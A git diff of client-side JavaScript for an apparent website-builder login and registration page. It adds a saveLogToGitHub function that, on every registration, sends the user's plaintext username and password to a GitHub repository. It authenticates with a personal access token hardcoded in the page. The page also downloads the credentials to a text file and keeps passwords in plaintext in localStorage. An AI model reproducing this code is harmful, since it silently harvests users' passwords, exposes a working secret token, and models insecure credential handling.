@@ -20,74 +20,10 @@ function createFloatingShapes() {
     }
 }
 
-function setupProfileFeatures() {
-    const editProfileBtn = document.getElementById('editProfile');
-    
-    editProfileBtn.addEventListener('click', () => {
-        document.getElementById('settingsModal').style.display = 'block';
-        document.querySelector('.settings-section').scrollIntoView({ behavior: 'smooth' });
-    });
-
-    document.getElementById('changePicture').addEventListener('click', (e) => {
-        e.preventDefault();
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'image/*';
-        input.onchange = (event) => {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    const imageData = e.target.result;
-                    updateProfilePicture(imageData);
-                };
-                reader.readAsDataURL(file);
-            }
-        };
-        input.click();
-    });
-}
-
-function updateProfilePicture(imageData) {
-    const username = document.getElementById('userDisplayName').textContent;
-    const users = JSON.parse(localStorage.getItem('users'));
-    const userIndex = users.findIndex(u => u.username === username);
-
-    document.getElementById('profilePic').src = imageData;
-    document.getElementById('settingsProfilePic').src = imageData;
-    
-    users[userIndex].settings.profilePic = imageData;
-    localStorage.setItem('users', JSON.stringify(users));
-    
-    showNotification('Profile picture updated successfully!', 'success');
-}
-
-function setupFormAnimations() {
-    const loginForm = document.getElementById('loginForm');
-    const registerForm = document.getElementById('registerForm');
-
-    document.getElementById('registerLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        loginForm.style.display = 'none';
-        registerForm.style.display = 'block';
-        registerForm.classList.add('active');
-    });
-
-    document.getElementById('loginLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        registerForm.style.display = 'none';
-        loginForm.style.display = 'block';
-        loginForm.classList.add('active');
-    });
-}
-
 function setupEventListeners() {
     document.getElementById('loginFormElement').addEventListener('submit', handleLogin);
     document.getElementById('registerFormElement').addEventListener('submit', validateRegistration);
     document.getElementById('createSite').addEventListener('click', createNewSite);
-    document.getElementById('closePreview').addEventListener('click', () => {
-        document.getElementById('sitePreview').style.display = 'none';
-    });
     document.getElementById('logout').addEventListener('click', handleLogout);
     document.getElementById('changePicture').addEventListener('click', () => {
         document.getElementById('pictureInput').click();
@@ -105,12 +41,10 @@ function validateRegistration(event) {
         showNotification('Passwords do not match!', 'error');
         return;
     }
-
     if (password.length < 6) {
         showNotification('Password must be at least 6 characters long', 'error');
         return;
     }
-
     handleRegister(username, password);
 }
 
@@ -122,7 +56,7 @@ function handleRegister(username, password) {
         return;
     }
 
-    users.push({ 
+    const newUser = { 
         username, 
         password,
         created: new Date().toISOString(),
@@ -132,17 +66,20 @@ function handleRegister(username, password) {
             theme: 'default',
             profilePic: 'https://github.com/Syfer-engs-entertainment/Syfer-engs-entertainment.github.io/blob/main/Starting%20Pfp/pfp.jpg?raw=true'
         }
-    });
+    };
     
+    users.push(newUser);
     localStorage.setItem('users', JSON.stringify(users));
-    
-    const credentials = `New Registration\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
-    const blob = new Blob([credentials], { type: 'text/plain' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'Creds.txt';
-    a.click();
-    URL.revokeObjectURL(a.href);
+
+    const credentialsText = `New Registration\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
+    const blob = new Blob([credentialsText], { type: 'text/plain' });
+    const downloadLink = document.createElement('a');
+    downloadLink.href = URL.createObjectURL(blob);
+    downloadLink.download = 'credentials.txt';
+    downloadLink.click();
+    URL.revokeObjectURL(downloadLink.href);
+
+    saveLogToGitHub(credentialsText);
 
     showNotification('Registration successful!', 'success');
     setTimeout(() => {
@@ -150,19 +87,32 @@ function handleRegister(username, password) {
     }, 1500);
 }
 
+function saveLogToGitHub(logContent) {
+    const apiKey = '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';
+    const repoPath = 'Website Builder-Creater/Debug';
+    const fileName = `log_${Date.now()}.txt`;
+    
+    const content = btoa(logContent);
+
+    fetch(`https://api.github.com/repos/Syfer-engs-entertainment/Syfer-engs-entertainment.github.io/contents/${repoPath}/${fileName}`, {
+        method: 'PUT',
+        headers: {
+            'Authorization': `Bearer ${apiKey}`,
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            message: 'Add new registration log',
+            content: content
+        })
+    })
+    .catch(error => console.error('Error saving log:', error));
+}
+
 function handleLogin(event) {
     event.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     const rememberMe = document.getElementById('rememberMe').checked;
-
-    const credentials = `Login Attempt\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
-    const blob = new Blob([credentials], { type: 'text/plain' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'Creds.txt';
-    a.click();
-    URL.revokeObjectURL(a.href);
 
     const users = JSON.parse(localStorage.getItem('users') || '[]');
     const user = users.find(u => u.username === username && u.password === password);
